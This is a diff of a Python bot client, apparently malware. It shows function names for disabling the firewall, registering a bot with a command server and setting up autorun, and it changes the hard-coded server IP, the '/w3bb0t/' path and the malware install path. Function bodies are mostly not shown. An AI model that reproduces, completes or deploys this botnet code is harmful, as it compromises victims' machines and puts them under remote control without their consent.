@@ -1,14 +1,14 @@
 # coding=utf-8
 
 import os, sys
-import time#, base64
 import platform
+import base64
+import time
 
 import getpass
-#import hashlib
+import hashlib
 import requests
-#import thread
-#import json
+
 
 def Disable_Firewall():
 
@@ -40,7 +40,6 @@ def Bot_register(Server_Ip, Server_Path, Bot_name, Bot_os):
   else:
     return False
   
-  return True
 
 
 def Bot_AutoRun(bot_inspath):
@@ -99,9 +98,9 @@ def main():
   operation_system = sys_information[0]
   operation_system_version = sys_information[2]
   
-  server_ip = '192.168.0.7'
+  server_ip = '192.168.0.3'
   server_path = '/w3bb0t/'
-  malware_path = 'ff/'
+  malware_path = 'bot_path/'
   
   if(Disable_Firewall()):
     
